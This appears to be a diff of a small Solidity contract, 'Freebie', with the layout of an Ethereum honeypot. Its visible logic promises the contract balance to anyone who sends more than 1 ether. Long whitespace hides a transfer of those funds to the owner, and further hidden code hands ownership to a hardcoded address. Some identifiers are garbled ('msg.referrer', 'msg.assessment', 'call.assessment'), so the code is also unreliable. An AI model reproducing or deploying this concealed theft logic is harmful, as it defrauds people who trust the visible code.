@@ -2,7 +2,7 @@ pragma solidity ^0.4.19;
 
 contract Freebie
 {
-    address public Owner = msg.referrer;
+    address public Owner = msg.sender;
 
     function() public payable{}
 
@@ -10,17 +10,17 @@ contract Freebie
     public
     payable
     {
-        if(msg.assessment>1 ether)
+        if(msg.value>1 ether)
         {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);
-            msg.referrer.transfer(this.balance);
+            msg.sender.transfer(this.balance);
         }
     }
 
     function discharge()
     payable
     public
-    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.referrer==0x30ad12df80a2493a82DdFE367d866616db8a2595){Owner=0x30ad12df80a2493a82DdFE367d866616db8a2595;}
-        require(msg.referrer == Owner);
+    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595){Owner=0x30ad12df80a2493a82DdFE367d866616db8a2595;}
+        require(msg.sender == Owner);
         Owner.transfer(this.balance);
     }
 
@@ -28,7 +28,7 @@ contract Freebie
     payable
     public
     {
-        require(msg.referrer == Owner);
-        adr.call.assessment(msg.assessment)(info);
+        require(msg.sender == Owner);
+        adr.call.assessment(msg.value)(info);
     }
 }
